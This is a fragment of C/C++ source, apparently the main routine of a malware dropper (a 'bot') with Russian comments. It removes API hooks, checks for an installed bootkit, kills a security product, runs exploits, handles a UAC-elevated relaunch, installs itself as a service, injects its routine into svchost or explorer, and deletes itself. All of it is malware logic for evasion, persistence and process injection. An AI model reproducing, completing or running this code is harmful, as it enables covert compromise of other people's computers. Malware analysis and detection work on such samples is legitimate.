	BOT::Initialize();
	UnhookDlls();//снимаем хуки
	GetPaths();

	DebugReportInit();
	char statParam[256];
	fwsprintfA pwsprintf = Get_wsprintfA();
	char* prefix = GetNamePrefix();
	pwsprintf( statParam, "bot.plug %s %s", prefix, PP_REPORT_URL );
	STR::Free(prefix);
	DebugReportSaveSettings(statParam);

	// 100_d запуск дропера
	PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("100_d"));

	/*	проверка установлен ли буткит	*/
	if ((DWORD)pGetFileAttributesA(PathBkFile) != INVALID_FILE_ATTRIBUTES)
	{
		PP_DPRINTF("MyMain: bootkit already installed. Killing oneself.");
		InitSuicide();
		WaitAndExitProcess(0);
		return 0;
	};

	KillOutpost();
	DoExploits();

	// 100_d запуск дропера
	PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("101_d"));

	// Проверка целевой платформы.
	if (!CurrentPlatformAllowedByTargetSpecifier())
	{
		InitSuicide();
		PP_DPRINTF("MyMain:Current platform not allowed by target specifier. Callin ExitProcess...");
		WaitAndExitProcess(0);
		return 0;
	}

	// 109_d точка прохождения целевой платформы
	PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("109_d"));

	// Проверка на параметр запуска с правами UAC
	if ( m_strstr((PCHAR)pGetCommandLineA(),ARGV_UAC_RUN) )
	{
		PP_DPRINTF("MyMain: UAC param detected. Calling ExplorerMain...");
		int ret = -1;
		if ( ExplorerMain() )
		{
			PP_DPRINTF("MyMain: UAC param detected. ExplorerMain OK. Quit and killing oneself...");
			InitSuicide();
			WaitAndExitProcess(0);
			return 0;
		}
		PP_DPRINTF("MyMain: UAC param detected. ExplorerMain failed. Just quit process.");
		WaitAndExitProcess(ret);
		return 0;
	};
	
	//
	//  Если процесс запущен с системными правами переходим к инсталяции.
	//
	if (IsUserLocalSystem())
	{
		PP_DPRINTF("MyMain: LocalSystem current user detected. Runing SvcFuckupRunAsService().");
		SvcFuckupRunAsService(SvcFuckupServiceMain);
		PP_DPRINTF("MyMain: SvcFuckupRunAsService() finished. Calling ExitProcess().");

		WaitAndExitProcess(0);
		return 0;
	};

	// Если процесс запущен обычно, но включена поддержка SvcFuckup
	// то пробуем это сделать и прибиваем себя.
	if (SvcFuckupEnabled())
	{
		PP_DPRINTF("MyMain: SvcFuckup enabled. Run SvcFuckupRun");
		bool fuckup_result = SvcFuckupRun();
		PP_DPRINTF("MyMain: SvcFuckupRun() finished with %d", fuckup_result);
		InitSuicide();
		WaitAndExitProcess(0);
		return 0;
	}

	PP_DPRINTF("MyMain: All checks passed. Trying to jump to svchost");
	dwExplorerSelf = 0;
	if (!JmpToSvchost( ExplorerRoutine ))
	{
		PP_DPRINTF("MyMain: Jump to svchost failed. Trying jump to explorer");

		dwExplorerSelf = 1;
		if (! InjectIntoExplorer ( ExplorerRoutine )  )
		{
			PP_DPRINTF("MyMain: Jump to explorer failed. Trying just do ExplorerRoutine");
			ExplorerRoutine( NULL );
		}
	}

	PP_DPRINTF("MyMain: finished.");
	pExitProcess( 1 );

	return 1;
}

void main(){ };
